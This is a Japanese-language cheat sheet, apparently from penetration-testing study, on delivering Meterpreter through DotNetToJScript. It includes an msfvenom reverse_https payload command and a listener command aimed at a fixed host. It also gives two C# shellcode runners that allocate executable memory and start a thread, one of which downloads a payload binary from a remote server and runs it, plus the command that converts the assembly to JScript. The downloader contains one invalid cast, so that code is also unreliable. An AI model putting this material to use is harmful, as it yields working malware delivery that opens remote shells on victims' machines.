C#をJscriptに変換するDotNetToJscriptを利用する方法
msvenomでペイロード生成
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f ps1
```

msfvenomでリスナー
```bash
msfconsole -q -x 'use exploit/multi/handler;set LHOST 192.168.45.217;set LPORT 443;set PAYLOAD windows/x64/meterpreter/reverse_https;exploit' 
```

DotNetToJscriptのソリューションに入ってるExampleAssemblyプロジェクトのTestClass.csに記載するシェルコードランナー
bufにmsfvenomのペイロードの配列を入れる。
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    public TestClass()
    {
        byte[] buf = new byte[758] { 0xfc, 0x48,..};

      int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

ダウンローダ版
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    public TestClass()
    {
        byte[] buf = new WebClient().DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
        
        int size = buf.Length;
        
        IntPtr addr = VirtualAlloc(IntPtr.Zero, uint(size), 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

JScript変換コマンド
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```